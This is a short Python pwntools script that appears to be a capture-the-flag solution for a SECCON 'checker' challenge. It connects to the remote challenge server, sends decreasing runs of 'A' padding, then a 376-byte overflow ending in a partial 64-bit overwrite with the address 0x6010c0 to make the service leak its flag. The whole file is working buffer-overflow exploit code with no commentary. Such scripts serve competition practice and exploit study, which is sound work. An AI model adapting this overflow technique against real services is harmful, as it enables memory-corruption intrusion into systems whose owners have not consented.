#!/usr/bin/python
from pwn import *

r = remote ("checker.pwn.seccon.jp", 14726)


flag = 0x6010c0




r.sendline ("back")

for i in range(10):
  pay = "A"*(384-i)
  r.sendline (pay)

r.sendline ("yes")
r.recvuntil ("FLAG :")

i = 376

pay = "A" * i 
pay += p64(flag)[0:3] 
r.sendline (pay)
pay = "A"* (i-4)
r.sendline (pay)

print r.recvuntil ("terminated")
